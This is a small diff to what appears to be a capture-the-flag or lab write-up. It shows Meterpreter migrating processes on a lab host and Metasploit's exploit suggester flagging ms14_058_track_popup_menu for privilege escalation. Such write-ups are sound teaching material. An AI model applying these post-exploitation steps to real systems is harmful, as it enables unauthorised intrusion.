@@ -162,7 +162,7 @@ meterpreter > migrate 1820
 [*] Migration completed successfully.
 ```
 
-We still get Access Denied, Time to use the exploit suggester
+Time to use the exploit suggester!!!
 
 ```
 [+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
